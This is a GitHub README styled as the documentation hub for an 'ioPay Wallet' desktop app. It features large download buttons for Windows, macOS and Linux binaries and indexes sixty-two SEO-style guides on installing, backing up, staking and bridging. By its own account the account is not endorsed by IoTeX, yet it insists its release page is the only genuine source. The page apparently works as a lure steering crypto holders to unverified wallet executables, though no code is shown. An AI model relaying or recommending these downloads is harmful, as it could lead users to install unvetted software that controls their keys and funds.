![ioPay Wallet](assets/banner-hub.png)

<h1 align="center">ioPay Wallet: desktop setup and safety guides</h1>

<p align="center"><em>Get the real build, keep the keys, move the value: the entry point to all sixty-two ioPay Wallet guides.</em></p>

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733)](#license) [![Release: v2.0.2](https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733)](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2)

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux a `.zip` holding a `.deb` and a `.pacman` package. Nothing else is published for this release.

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What this repository is for

This is the index repository of the ioPay Wallet documentation account, and the collection a reader should open first. It covers the three jobs that decide whether a desktop wallet goes well: installing the genuine v2.0.2 build on the right platform, making the account recoverable before it holds value, and moving IOTX in and out without sending it to the wrong address form. Its own thirty guides are the installation, recovery, security and transfer pages; the tables further down also index the twenty staking, bridge and DePIN guides and the twelve comparison and release pages that live in the other two repositories.

The writing assumes a reader who has the installer, or is about to download one, and who wants the wallet working rather than a tour of its features. Every guide starts from a question someone actually types into a search engine, answers it in the first sentence, and then shows the sequence that follows. Where the project publishes nothing - an audit report, a supported Trezor model list - the page says so instead of filling the gap with a plausible sentence.

## Who it is for

- **Someone installing for the first time.** You have an installer, or you are about to download one, and you want the real build rather than a lookalike.
- **Someone holding a balance they cannot afford to lose.** You want the backup and the recovery path sorted before the amount matters.
- **Someone arriving from the mobile app or an exchange.** You have IOTX somewhere else and need it in the desktop wallet, with the addresses understood first.
- **Someone fixing something that broke.** The app will not start, the PIN is rejected, a transfer is stuck, or the history is missing.

## Start here

1. [What Is ioPay Wallet?](what-is-iopay-wallet.md) - the model the rest of the guides assume.
2. [Install ioPay Wallet on Windows](install-iopay-wallet-on-windows.md) - the download check and the install, step by step.
3. [How to Back Up an ioPay Seed Phrase](how-to-back-up-an-iopay-seed-phrase.md) - the artifact that makes recovery possible.
4. [Spotting Fake ioPay Wallet Downloads](spotting-fake-iopay-wallet-downloads.md) - three files, four checks, and the lookalikes that rank.

## How to use these guides

1. **Read the install guide for your platform before you run anything.** The three packages differ, and one of them is a zip rather than an installer.
2. **Do the backup immediately after the first launch**, then test a restore from it. A backup you have never used is a hope, not a backup.
3. **Check the version you installed** against the release page, so the guide you are reading matches the build you are running.
4. **Keep the security guides for the day something goes wrong**, and read the one that matches the symptom rather than the most alarming one.
5. **Follow the transfer guides in order** when moving value in: addresses first, then the send, then the fee.

## The guides grouped

### Get it installed.

The installation cluster exists because the release publishes three files whose SHA-256 values are listed in the app README, and because the platform procedures genuinely differ. Windows runs an `.exe`, macOS mounts a `.dmg` and may report a damaged copy that is really a quarantine flag, and Linux hands you a zip that has to be unpacked with its execute bit restored. The pages below name the exact file each platform receives, the size it should be, and the first-launch sequence that follows. They also cover the two questions that arrive before an install: what the wallet is, and which of the several builds carrying this name is the current one.

<div align="center">

| Guide | What it answers |
|---|---|
| [What Is ioPay Wallet? The Desktop Wallet for IoTeX, Explained](what-is-iopay-wallet.md) | ioPay Wallet is the desktop wallet for IoTeX: local keys, io1 and 0x addresses, staking, bridging, swapping and DePIN income in one app, release v2.0.2. |
| [How to Install ioPay Wallet on Windows (v2.0.2)](install-iopay-wallet-on-windows.md) | Install ioPay Wallet on Windows from the v2.0.2 .exe: the checks before you run it, the first-launch PIN, both address forms, and fixes for a blocked file. |
| [ioPay Wallet on macOS: Install and First Launch](iopay-wallet-installation-guide-for-macos.md) | ioPay Wallet on macOS arrives as a 21.5 MB .dmg. Mount it, drag to Applications, clear the damaged-app prompt, and confirm both addresses on first launch. |
| [Installing ioPay Wallet Desktop on Linux](iopay-wallet-desktop-install-on-linux.md) | The Linux build of ioPay Wallet is a zip, not a .deb or AppImage. Unpack it, restore the execute bit, read missing-library errors, keep your data directory. |
| [How to Back Up Your ioPay Wallet Seed Phrase](how-to-back-up-an-iopay-seed-phrase.md) | Write the phrase down once, store it offline, and prove the backup works before funding the account. |
| [Restoring ioPay Wallet From a Seed Phrase](restoring-iopay-wallet-from-a-seed-phrase.md) | Import the phrase into a fresh install and confirm both address forms appear for the same account. |
| [Updating ioPay Wallet to the Current Release (v2.0.2)](updating-iopay-wallet-to-the-latest-version.md) | Update ioPay Wallet to v2.0.2 by auto-update or installer. Why version claims come from the release page, since the release body carries no changelog. |
| [ioPay Wallet System Requirements](iopay-wallet-system-requirements.md) | What ioPay Wallet v2.0.2 asks of your machine: supported Windows, macOS and Linux versions, disk needs, and the system details the release does not publish. |
| [Moving From ioPay Mobile to the Desktop Wallet](moving-iotx-from-iopay-mobile-to-desktop-wallet.md) | Moving IOTX from ioPay mobile to the desktop build: export or restore, why both addresses must match, and why a staking bucket looks like a missing balance. |
| [Importing an IoTeX Private Key Into ioPay Wallet](import-an-iotex-private-key-into-iopay.md) | Bring a single key into the wallet, and what that key can and cannot do. |
| [Watch-Only Addresses in ioPay Wallet](watch-only-addresses-in-iopay-wallet.md) | Watch-only addresses in ioPay let you follow balances and staking positions with no keys on the machine. What it shows, what it cannot sign, and who it suits. |

</div>

### Keep the keys

Recovery pages outnumber every other kind in this collection, because recovery is where a wallet either proves itself or fails. The phrase, the private key and the keystore file are three different artifacts, and the guides keep them separate on purpose: an account created by phrase cannot be restored from a keystore, and an imported key does not produce a phrase. The hardware pages sit in this cluster too, because a Ledger or a Trezor is a backup decision as much as a signing one. So do the pages about a rejected PIN and a local database that will not open, where the safe order is always the same: find the backup before you reinstall.

<div align="center">

| Guide | What it answers |
|---|---|
| [Spotting Fake ioPay Wallet Downloads](spotting-fake-iopay-wallet-downloads.md) | One download route, three files, four checks. How to tell the real ioPay v2.0.2 release from lookalike sites, and what to do if you already installed a fake. |
| [Is ioPay Wallet Safe? Custody, Code and What to Check](is-iopay-wallet-safe-to-use.md) | Is ioPay Wallet safe? Self-custody, the Apache-2.0 code, an audit branch with no published report, and the four threats the app lock does not protect against. |
| [ioPay Password Not Working? What the App Lock Actually Is](iopay-wallet-password-not-working.md) | ioPay password not working? Separate the app lock from the phrase, learn what a locked account still holds, and why restoring beats guessing every time. |
| [Recovering a Wallet and an Old Staking Position](recover-a-locked-iopay-wallet-account.md) | Recovering an ioPay account from a phrase, key or keystore, and finding the staking position a restore seems to lose. Which order to check, step by step. |
| [Connecting a Ledger to ioPay Wallet](connecting-a-ledger-device-to-iopay-wallet.md) | Connecting a Ledger to ioPay Wallet: the USB signing path, address verification on the device screen, and what the wallet can do once keys stay offline. |
| [\"Database Corrupted\": What to Do When ioPay Will Not Start](iopay-wallet-database-corrupted-fix.md) | Repair or reinstall when the local store will not read, without losing an unbacked account. |
| [Connecting a Trezor to ioPay Wallet](connecting-trezor-to-iopay-wallet.md) | Trezor support in ioPay, and how the route differs from Ledger: the device confirms the address, the wallet shows both forms, and what hardware does not cover. |
| [The Open-Source Code Behind ioPay Wallet](open-source-code-behind-iopay-wallet.md) | The licence, the audit branch, and what a public repository does and does not prove. |
| [Phishing Warnings, Approvals and WalletConnect: What to Reject](iopay-wallet-phishing-warnings-explained.md) | ioPay phishing warnings are one layer, not a guarantee. What they catch, the approvals they cannot judge, and the checks that replace an unreliable warning. |

</div>

### Move value

Transfer guides are written in the order value actually moves: understand the two address forms, receive, send, then read the fee and the status. The two address encodings are the single most common source of loss on IoTeX, so the cluster opens with them rather than assuming them. The exchange pages follow, because a withdrawal form asks for a network as well as an address, and a balance that looks missing after a staking position is usually a delegated stake rather than a failed transfer. The last pages in the cluster deal with the states a reader meets after the send: pending, broadcast failure, a history with a gap, and a balance that has not refreshed.

<div align="center">

| Guide | What it answers |
|---|---|
| [\"Error Fetching Timestamp\": When ioPay Wallet Cannot Reach the IoTeX Network](iopay-wallet-not-connecting-to-network.md) | Error fetching timestamp means the app could not reach an IoTeX node. Work the network ladder, and know why it cannot mean your funds moved or were stolen. |
| [ioPay Balance Not Updating? Why the Number Is Behind](iopay-wallet-balance-not-updating.md) | Why a balance sticks at an old number, and how to tell a display fault from a real send. |
| [ioPay Transaction Stuck as Pending - and \"Fail to Broadcast Action\"](iopay-wallet-transaction-stuck-pending.md) | Fail to broadcast and pending are opposite failures: one never reached the network, the other is real. When a resend is safe, and when it doubles a transfer. |
| [How to Send IOTX From ioPay Wallet](how-to-send-iotx-from-iopay-wallet.md) | Send IOTX from ioPay Wallet in four fields: address, amount, fee, confirm. Which of the two address forms to paste, and why leaving no gas breaks every retry. |
| [Receiving IOTX in ioPay Wallet: Addresses, Formats and What to Share](receiving-iotx-in-iopay-wallet.md) | The receive flow, the address form to share, and what confirms the funds arrived. |
| [io1 and 0x: Why ioPay Wallet Shows Two Addresses](io1-and-0x-addresses-in-iopay.md) | One account, two encodings, and when each address form is the correct one to give out. |
| [Sending IOTX From Coinbase to ioPay Wallet](sending-iotx-from-coinbase-to-iopay.md) | Sending IOTX from Coinbase to ioPay is decided by the network you pick, not the address. What changes if you choose Ethereum ERC-20, and how to recover. |
| [Withdrawing IOTX From an Exchange to ioPay Wallet](withdrawing-iotx-from-an-exchange-to-iopay.md) | Network choice, the address, the memo question and the first confirmation, in order. |
| [ioPay Wallet Fees, Explained](iopay-wallet-fees-explained.md) | What ioPay Wallet charges and what the chain charges: network fees, bridge quotes with two gas costs, swap price impact, and why the wallet takes no cut. |
| [Missing Transaction History in ioPay Wallet](iopay-wallet-missing-transaction-history.md) | A history that stops short, and how to tell a cache problem from a settled gap. |

</div>

### Staking, the bridge and DePIN

The twenty guides in the second repository cover what the wallet does with IOTX once it is held: validator choice, the unstaking countdown, compounding, the IoTube bridge and its 2026 incident, swap slippage, and DePIN device income. They are listed here so that the index is complete rather than partial, and they link back to the setup pages whenever a step assumes a working install.

<div align="center">

| Guide | What it answers |
|---|---|
| [ioPay Staking Rewards Not Showing? What Changed and What to Check](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-rewards-not-showing-up.md) | Rewards missing? Check votes versus tokens, a stake-lock countdown, a new bucket, then sync. The Hermes claim step is gone since IIP-59, and that is expected. |
| [How to Stake IOTX in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) | Stake IOTX in ioPay Wallet in four decisions: validator, amount, duration, stake-lock. The protocol parameters, the bucket, and why 92k votes is not 92k IOTX. |
| [Choosing an IoTeX Validator in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/best-iotex-validator-for-iopay-staking.md) | Choosing an IoTeX validator without a ranking: read APY, uptime, commission and stake concentration, then split, and price in the exit before you switch. |
| [IoTeX Staking Rewards: APY, Minimums and Using the Calculator](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-apy-calculator-guide.md) | Use the ioPay staking calculator honestly: what the protocol fixes, why no single APY is a fact, and how to project daily, monthly and yearly figures. |
| [IoTeX Unstaking: The Three-Day Wait, Explained](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md) | Unstaking IOTX is a sequence rather than a button: stake-lock off, about three days, unstake, then withdraw, and why the last two steps stay separate. |
| [Compounding IOTX Staking Rewards in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-compound-iotx-rewards-in-iopay.md) | Compounding IOTX rewards in ioPay: one-click re-stake, what it does to your bucket structure, when it pays, and when the exit rules make it a bad idea. |
| [IoTeX Burn-Drop: What It Is and Whether You Receive It](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-burn-drop-rewards-in-iopay.md) | IoTeX burn-drop explained: device activation burns IOTX and restakes it to qualified staking buckets, so the allocation follows staking, not a device payoff. |

</div>

<div align="center">

| Guide | What it answers |
|---|---|
| [The IoTube Incident: What It Changed and What to Do If a Transfer Was Affected](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) | The February 2026 IoTube incident in dated facts: unauthorised CIOTX minting, the claims portal, IIP-56, and what to check if a bridge transfer was affected. |
| [IoTube Swap Not Working? Fixing Bridge Errors in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md) | IoTube swap failing? Rule out an old build, missing destination gas, the bridge minimum, the wrong IOTX variant or no network, in that order, before retrying. |
| [How to Use the IoTube Bridge in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) | The route, the two gas costs and the status tracker, from one chain to the other. |
| [Bridging IOTX From Ethereum to ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) | Bridging IOTX from Ethereum: native, ERC-20, wrapped and retired CIOTX are four different assets, and the wrong one will bridge and then refuse to stake. |
| [Moving BSC or Polygon Tokens Into ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/moving-bsc-tokens-into-iopay-wallet.md) | Moving BSC or Polygon tokens into ioPay: the route, the gas you need on both sides, and why what arrives is a representation rather than the native asset. |
| [Bridge Fees vs Exchange Transfers: What Actually Costs Less](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-bridge-fees-versus-exchange-transfers.md) | What a bridge costs against an exchange withdrawal, with both gas costs counted. |
| [Setting Slippage for a Token Swap in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-token-swap-slippage-settings.md) | How the slippage setting decides whether a swap settles, and when to leave it alone. |

</div>

<div align="center">

| Guide | What it answers |
|---|---|
| [What Is DePIN? Decentralised Physical Infrastructure, Explained](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/depin-explained-for-iopay-wallet-users.md) | DePIN means physical infrastructure run by independent operators: the three tests that separate it from a token attached to hardware, and where IoTeX fits. |
| [What Is a DePIN Wallet? Why ioPay Wallet Has Device Screens](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/why-iopay-wallet-is-built-for-depin.md) | What makes a wallet a DePIN wallet: device identity, per-device earnings and allocations tied to staking buckets, plus what a wallet cannot do for hardware. |
| [The ioPay DePIN Dashboard: Reading Your Device Earnings](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-depin-earnings-dashboard-explained.md) | Read the ioPay DePIN dashboard without mixing four panels: device earnings, burn-drop allocations, portfolio value and calculator output have different owners. |
| [Tracking DePIN Device Rewards in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/tracking-depin-device-rewards-in-iopay-wallet.md) | Track DePIN rewards in ioPay: register the device, record a baseline, keep burn-drop apart from project earnings, check weekly, export if you report income. |
| [Registering an ioID Device With ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/registering-an-ioid-device-with-iopay.md) | Register an ioID device from ioPay in five steps, see what the transaction actually creates, and why a failed registration locks nothing and can be retried. |
| [The DePIN Project Explorer in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-depin-project-explorer.md) | The DePIN project explorer in ioPay is a directory, not a ranking. Five questions that filter harder than any listing before you point hardware at a project. |

</div>

### Choosing and checking the wallet

The twelve guides in the third repository answer the questions that come before installation and after it: whether this is the right wallet for how you hold, how it compares with other desktop wallets on custody and addresses, how it differs from the mobile app, and where the code, the versions and the support actually live. A reader who is still deciding can start there and come back to this page once the answer is yes.

<div align="center">

| Guide | What it answers |
|---|---|
| [Best Crypto Wallet for Beginners: How to Choose Your First, and Where Desktop Fits](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-for-beginners-choosing-a-first-defi-wallet.md) | No best beginner wallet in the abstract. Five decisions that pick one, five things that disqualify it, and the criteria applied to ioPay Wallet for IoTeX. |
| [How ioPay Wallet Compares to Other Desktop Wallets](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-iopay-wallet-compares-to-other-desktop-wallets.md) | Custody, addresses and staking compared on stated criteria rather than on a ranking. |
| [Is ioPay a Good Alternative to a Mainstream Desktop Wallet?](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/is-iopay-a-good-desktop-wallet-alternative.md) | Is ioPay a good alternative to a mainstream desktop wallet? Yes for IoTeX work, no for multi-chain holding, and the three detours a general wallet imposes. |
| [ioPay Wallet and Browser Extensions: Which to Use, and How to Run Both](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/using-iopay-wallet-beside-browser-extensions.md) | Which jobs belong in a desktop wallet and which belong in a browser extension. |
| [ioPay Wallet's Role in the IoTeX Ecosystem](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-role-in-the-iotex-ecosystem.md) | Where ioPay sits in IoTeX: a desktop client, not the chain. Why no price, market cap, supply or listing claim appears here, and what can be said structurally. |
| [NFTs and XRC-20 Tokens in ioPay Wallet](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-nft-and-token-support.md) | What ioPay Wallet shows for tokens and NFTs: XRC-20 balances, how they appear per account, and the NFT features this build does not claim to have at all. |

</div>

<div align="center">

| Guide | What it answers |
|---|---|
| [Which ioPay Wallet Build Is Current? Desktop Releases Explained](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md) | More than one desktop app carries the ioPay name. Four checks separate the current v2.0.2 build from the earlier client, starting with its backup model. |
| [How to Get Help With ioPay Wallet](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) | Which support route exists, which claims to ignore, and why no route needs the phrase. |
| [ioPay Desktop vs the ioPay Mobile App](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/comparing-desktop-iopay-with-the-mobile-app.md) | Desktop ioPay against the mobile app: separate builds, one phrase, different surfaces, and the jobs that belong on a large screen rather than a phone. |
| [The ioPay Wallet Repository, Explained](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-on-github-explained.md) | What is actually in the ioPay Wallet repository: the release assets, the Apache-2.0 licence, the audit branch, and a changelog that documents something else. |
| [ioPay Wallet Versions and Release Notes](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md) | ioPay Wallet versions and release notes: why v2.0.2 has no changelog, where version claims come from, and how to tell a current build from an older one. |
| [ioPay Wallet: Frequently Asked Questions for New Users](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-faq-for-new-users.md) | Twelve questions new ioPay users ask, answered in a line each: installing, backup, addresses, staking, burn-drop, endorsement, and the first thing to do. |

</div>

## What each guide changes

| Task | Guide | Outcome |
|---|---|---|
| Get a trustworthy installer | [Spotting fake downloads](spotting-fake-iopay-wallet-downloads.md) | You can tell the release from a lookalike by name, version, size and source page. |
| Install on your platform | [Windows](install-iopay-wallet-on-windows.md), [macOS](iopay-wallet-installation-guide-for-macos.md), [Linux](iopay-wallet-desktop-install-on-linux.md) | The real build is running and you know which file you used. |
| Make the account recoverable | [Backup guide](how-to-back-up-an-iopay-seed-phrase.md) | The phrase exists offline and a restore has been tested once. |
| Get IOTX in | [Withdrawing from an exchange](withdrawing-iotx-from-an-exchange-to-iopay.md) | Funds land at your address, on the right chain, in the right form. |
| Sign with hardware | [Ledger](connecting-a-ledger-device-to-iopay-wallet.md), [Trezor](connecting-trezor-to-iopay-wallet.md) | The key stays on the device and the address is confirmed on its screen. |
| Fix a broken start | [Database corrupted](iopay-wallet-database-corrupted-fix.md) | You repair or reinstall without losing an unbacked account. |

## Common first questions

### Is there an ioPay account or login?

No. The wallet is local: there is no sign-up, no email and no server-side credential, and the PIN you set unlocks the app on that machine rather than an account anywhere.

### Where do the funds live?

On the IoTeX chain, at an address derived from your key. The app shows them; it does not hold them, which is why a reinstall is safe and why a lost phrase is not.

### Which file do I download?

The one on the release page whose name carries both the platform and the version. Anything else, including a differently named build from a review site, is not this release.

### What happens if I forget the PIN?

You restore from your phrase into a fresh install and set a new one. Nothing is lost except the time, because the PIN protects the app and the phrase protects the account.

### Does this repository cover staking and bridging?

Only where a transfer touches them. Staking, the bridge and DePIN income live in [staking-bridge-and-depin](https://github.com/iopay-project/staking-bridge-and-depin).

## What this repository does not cover

It does not explain how the application is built, and it does not offer a support desk. There is no issue tracker on these repositories, no email address that answers with credentials, and no route that needs the recovery phrase. It also does not publish an audit report, because the release publishes neither; the pages that discuss integrity say what can actually be checked instead of inventing a value. Where a chain parameter matters - the minimum stake, the unstaking duration, the two address forms - the guides use IoTeX documentation and say when the project's own specification disagrees with it.

## Before you install

- **The release is v2.0.2, published 19 November 2026.** Three assets: one `.exe`, one `.dmg`, one `.zip`.
- **SHA-256 values are published in the app README, but no signature is**, so a hash confirms the file and says nothing about who reviewed it.
- **The phrase is written down before the account is funded.** Not after.
- **The app lock is a convenience, not a recovery mechanism.** They are different artifacts and they fail differently.

## About

These guides describe ioPay Wallet Desktop as published in the v2.0.2 release and the IoTeX chain behaviour that surrounds it. They are documentation, not an endorsement: no claim of IoTeX approval is made anywhere, and IoTeX's own documentation lists the mobile app rather than this desktop build.

Corrections follow the release. Where a behaviour is not published - an audit report, a supported Trezor model list - the guide says so instead of guessing. Pages are written in ASCII and link only to GitHub: the wallet repository, its tagged release and the other guide repositories on this account.

## License

Apache-2.0, matching the wallet's own licence.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [Staking, bridge and DePIN](https://github.com/iopay-project/staking-bridge-and-depin) - [Choosing the right wallet](https://github.com/iopay-project/choosing-the-right-wallet)
